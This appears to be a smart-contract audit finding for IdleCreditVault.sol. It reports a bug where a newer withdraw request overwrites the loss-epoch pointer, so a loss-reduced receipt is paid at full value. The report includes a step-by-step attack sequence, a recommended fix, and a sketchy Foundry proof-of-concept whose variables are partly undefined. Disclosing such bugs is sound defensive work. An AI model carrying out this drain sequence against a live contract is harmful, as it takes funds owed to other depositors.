### Title
Loss-adjusted withdraw receipts are paid at par once a newer request overwrites `lastWithdrawRequest` — haircut bypass steals from other claimants - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
Analogous to CVE-2026-53270 — where `svc->scheduler` is cleared only after the old scheduler's RCU teardown starts, leaving a stale pointer to freed `sched_data` — `IdleCreditVault` keeps a *single-slot* epoch pointer (`lastWithdrawRequest[user]`) to resolve which epoch's `lossRecoveryPriceByEpoch` haircut applies to a user's pending receipts. When a user holds a receipt from a loss-adjusted epoch and then files a newer withdraw request, the pointer is re-pointed to the newer epoch, the older epoch's haircut price becomes unreachable, and the aggregate `withdrawsRequests[user]` is paid at par via `_claimFundedWithdrawRequest`. The stale-pointer mapping silently "frees" the haircut accounting while the receipt it described is still spendable.

### Finding Description
`collectWithdrawFunds` records a per-epoch haircut when the borrower under-funds pending withdrawals (`stopEpochWithDuration` loss path):

```solidity
uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
pendingWithdraws = 0;
lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
```
`IdleCreditVault.sol:417-421` — the strategy only ever received `_amount < pendingBasis`.

On claim, `_claimLossAdjustedWithdrawRequest` resolves the loss epoch exclusively through the scalar `lastWithdrawRequest[_user]`:

```solidity
uint256 lossEpoch = lastWithdrawRequest[_user];
uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
if (lossRecoveryPrice == 0) return amount;
```
`IdleCreditVault.sol:790-792`

If it returns 0, `_claimFundedWithdrawRequest` then pays the *aggregate* `withdrawsRequests[_user]` — which still contains the loss-adjusted epoch's `withdrawsRequestsByEpoch[user][lossEpoch]` amount — at par and burns `normalAmount` receipt tokens:

```solidity
uint256 normalAmount = withdrawsRequests[_user];
...
amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
_burn(_user, normalAmount + apr0PrincipalAmount);
withdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
```
`IdleCreditVault.sol:338-349`

Attack sequence (named phases):

1. **Buffer epoch N**: attacker calls `requestWithdraw` → `withdrawsRequestsByEpoch[attacker][N]`, `withdrawsRequests[attacker]`, `lastWithdrawRequest[attacker] = N` are set; receipt strategy tokens are minted to the attacker.
2. **Stop of epoch N** (honest manager calls `stopEpochWithDuration(_lossAmount > 0)`): `previewLossAdjustedWithdrawFunds` assigns pro-rata loss to pending receipts; `collectWithdrawFunds` pulls only the haircutted amount and stores `lossRecoveryPriceByEpoch[N] < RECOVERY_FULL`; `epochNumber` becomes N+1.
3. **Buffer epoch N+1**: attacker calls `requestWithdraw` again → `lastWithdrawRequest[attacker] = N+1`. The epoch-N haircut pointer is now orphaned — exactly the "pointer still dangling after its data was released" shape of the IPVS bug.
4. **After epoch N+1 ends**: attacker calls `claimWithdrawRequest`. `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[N+1]` → 0 → returns. `_claimFundedWithdrawRequest` passes the `epochNumber > lastWithdrawRequest` check and pays epoch-N basis at par.

Note this is not blocked by `_clearWithdrawClaimForEpoch` (only invoked when the resolved epoch has a nonzero price) nor by the `_transferFundedClaim` reserve guard, which only protects `defaultRecoveryReserve`, not other users' funded claims.

### Impact Explanation
The attacker recovers `claimBasis` instead of `claimBasis * lossRecoveryPrice / RECOVERY_FULL` for the epoch-N receipt. The excess `(claimBasis * (RECOVERY_FULL - price)) / RECOVERY_FULL` is paid from strategy-held underlyings that were only funded for the haircutted amount — i.e., stolen from other users' funded claims, or causing their claims to revert on insufficient balance (temporary/permanent freezing of unclaimed yield). Loss scales with the attacker's loss-adjusted receipt size and the haircut depth; a 50% haircut on a receipt equal to half the pending bucket doubles the attacker's payout for that portion.

### Likelihood Explanation
Requires only an unprivileged tranche holder who files two withdraw requests across a loss-adjusted `stopEpochWithDuration` boundary — a normal, permissionless flow. `stopEpochWithDuration` is invoked by the honest manager whenever the borrower repays less than owed, which is the designed loss path, not an edge case. No privileged misbehavior needed; the ordering flaw is deterministic once `_lossAmount > 0` is used at any epoch where a user later re-requests.

### Recommendation
Resolve loss-adjusted claims per receipt epoch rather than via the scalar `lastWithdrawRequest`: iterate/check `withdrawsRequestsByEpoch[user][e]` for every epoch `e` with `lossRecoveryPriceByEpoch[e] != 0` (or track a per-user list/earliest-loss-epoch pointer), and subtract each loss-adjusted epoch's basis from the funded-claim aggregate before paying at par — i.e., "clear the pointer early": consume the epoch-N basis at its haircut price inside `_claimLossAdjustedWithdrawRequest` for *all* stale loss epochs, not only `lastWithdrawRequest`.

### Proof of Concept
```solidity
// Foundry fork-style PoC (contracts context: IdleCreditVault / IdleCDOEpochVariant)
function testLossHaircutBypassedByNewerRequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    _depositWithUser(attacker, amount, true);   // AA deposit, epoch 0 buffer

    _startEpochAndCheckPrices(0);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche));   // receipt in epoch N

    // Honest manager stops epoch N with a realized loss (partial borrower repay)
    uint256 loss = pendingBasis / 2;                   // 50% haircut
    _fundBorrowerPartial(expectedFunds - loss);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(apr, duration, loss);
    // lossRecoveryPriceByEpoch[N] = RECOVERY_FULL/2; epochNumber = N+1

    // Attacker files a new request in epoch N+1 -> lastWithdrawRequest = N+1
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Run epoch N+1 normally and stop it fully funded
    _startEpochAndCheckPrices(1);
    _fundBorrowerFull();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(apr, 0);

    uint256 balBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balBefore;

    // Epoch-N basis paid at PAR instead of at lossRecoveryPriceByEpoch[N]
    uint256 epochNBasis = withdrawsRequestsByEpochBefore; // recorded pre-claim
    assertGe(paid, epochNBasis + epochN1Basis);           // no haircut applied
}
```
Expected: `paid` equals the un-haircutted sum of both receipts, while `lossRecoveryPriceByEpoch[N]` was never consumed — the strategy paid out more underlying than it collected for epoch N receipts, directly draining funds reserved for other claimants.
